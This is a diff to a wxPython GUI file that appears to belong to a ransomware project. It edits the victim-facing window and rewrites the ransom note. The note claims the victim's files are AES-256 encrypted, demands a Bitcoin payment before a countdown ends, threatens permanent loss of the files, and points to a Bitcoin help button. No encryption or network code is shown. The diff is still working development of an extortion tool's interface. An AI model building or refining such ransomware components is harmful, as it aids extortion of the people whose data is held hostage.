@@ -25,7 +25,7 @@ class MainFrame ( wx.Frame ):
 		
 		MainSizer = wx.BoxSizer( wx.VERTICAL )
 		
-		MainSizer.SetMinSize( wx.Size( 940,710 ) ) 
+		MainSizer.SetMinSize( wx.Size( 940,750 ) ) 
 		self.HeaderPanel = wx.Panel( self, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
 		HeaderSizer = wx.BoxSizer( wx.VERTICAL )
 		
@@ -61,7 +61,7 @@ class MainFrame ( wx.Frame ):
 		self.m_panel81 = wx.Panel( self.BodyPanel, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
 		bSizer192 = wx.BoxSizer( wx.VERTICAL )
 		
-		self.LockBitmap = wx.StaticBitmap( self.m_panel81, wx.ID_ANY, wx.Bitmap( u"../build/Resources/new_lock.bmp", wx.BITMAP_TYPE_ANY ), wx.Point( -1,-1 ), wx.DefaultSize, 0 )
+		self.LockBitmap = wx.StaticBitmap( self.m_panel81, wx.ID_ANY, wx.NullBitmap, wx.DefaultPosition, wx.DefaultSize, 0 )
 		bSizer192.Add( self.LockBitmap, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 7 )
 		
 		
@@ -98,10 +98,10 @@ class MainFrame ( wx.Frame ):
 		
 		bSizer18 = wx.BoxSizer( wx.VERTICAL )
 		
-		self.RansomNoteText = wx.TextCtrl( self.BodyPanel, wx.ID_ANY, u"The important files on your computer have been encrypted with military grade AES-256 bit encryption.\n\nYour documents, videos, images and other forms of data are now inaccessible, and cannot be unlocked without the decryption key. This key is currently being stored on a remote server.\n\nTo acquire this key, transfer a total of 1 BTC to the Bitcoin wallet address below within 72 hours.\n\nIf you fail to take action within this time window, the decryption key will be destoyed and access to your files will be permanently lost.", wx.DefaultPosition, wx.DefaultSize, wx.TE_MULTILINE|wx.TE_NO_VSCROLL|wx.TE_READONLY )
-		self.RansomNoteText.SetFont( wx.Font( 14, 75, 90, 90, False, "Courier New" ) )
+		self.RansomMessageText = wx.TextCtrl( self.BodyPanel, wx.ID_ANY, u"The important files on your computer have been encrypted with military grade AES-256 bit encryption.\n\nYour documents, videos, images and other forms of data are now inaccessible, and cannot be unlocked without the decryption key. This key is currently being stored on a remote server.\n\nTo acquire this key, transfer the Bitcoin fee to the Bitcoin wallet address before the time runs out.\n\nIf you fail to take action within this time window, the decryption key will be destoyed and access to your files will be permanently lost.\n\nFor more information on what Bitcoin is, and to learn where you can buy Bitcoins, click the Bitcoin button directly below the timer.", wx.DefaultPosition, wx.DefaultSize, wx.TE_MULTILINE|wx.TE_NO_VSCROLL|wx.TE_READONLY )
+		self.RansomMessageText.SetFont( wx.Font( 14, 75, 90, 90, False, "Courier New" ) )
 		
-		bSizer18.Add( self.RansomNoteText, 3, wx.ALL|wx.EXPAND, 7 )
+		bSizer18.Add( self.RansomMessageText, 3, wx.ALL|wx.EXPAND, 7 )
 		
 		
 		bSizer17.Add( bSizer18, 1, wx.EXPAND, 5 )
@@ -124,7 +124,7 @@ class MainFrame ( wx.Frame ):
 		self.m_panel9 = wx.Panel( self.FooterPanel, wx.ID_ANY, wx.DefaultPosition, wx.DefaultSize, wx.TAB_TRAVERSAL )
 		bSizer22 = wx.BoxSizer( wx.VERTICAL )
 		
-		self.BitcoinButton = wx.BitmapButton( self.m_panel9, wx.ID_ANY, wx.Bitmap( u"../../../Users/Administrator/Desktop/baccepted.bmp", wx.BITMAP_TYPE_ANY ), wx.DefaultPosition, wx.DefaultSize, wx.BU_AUTODRAW )
+		self.BitcoinButton = wx.BitmapButton( self.m_panel9, wx.ID_ANY, wx.NullBitmap, wx.DefaultPosition, wx.DefaultSize, wx.BU_AUTODRAW )
 		bSizer22.Add( self.BitcoinButton, 0, wx.ALIGN_CENTER_HORIZONTAL|wx.ALL, 5 )
 		
 		
@@ -191,7 +191,7 @@ class MainFrame ( wx.Frame ):
 		bSizer19.Add( self.EnterDecryptionKeyButton, 1, wx.ALL|wx.EXPAND, 5 )
 		
 		
-		bSizer221.Add( bSizer19, 1, wx.ALIGN_RIGHT|wx.EXPAND, 5 )
+		bSizer221.Add( bSizer19, 2, wx.ALIGN_RIGHT|wx.EXPAND, 5 )
 		
 		
 		self.m_panel10.SetSizer( bSizer221 )
